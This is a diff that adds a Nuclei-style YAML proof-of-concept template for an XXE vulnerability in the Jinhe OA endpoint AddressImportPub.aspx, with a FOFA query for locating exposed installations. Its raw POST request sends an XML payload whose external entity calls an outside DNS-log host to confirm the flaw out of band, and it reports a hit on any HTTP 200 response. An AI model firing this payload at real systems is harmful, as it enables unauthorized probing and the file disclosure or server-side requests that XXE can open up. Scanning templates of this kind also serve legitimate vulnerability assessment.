@@ -1,0 +1,34 @@
+id: poc-yfwxzunhbbtfzm87
+info:
+  name: 金和OA AddressImportPub.aspx 存在XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yfwxzunhbbtfzm87'
+  tags: xxe,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yfwxzunhbbtfzm87
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - 'POST /c6/Jhsoft.Web.addressbook/AddressImportPub.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/xml
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
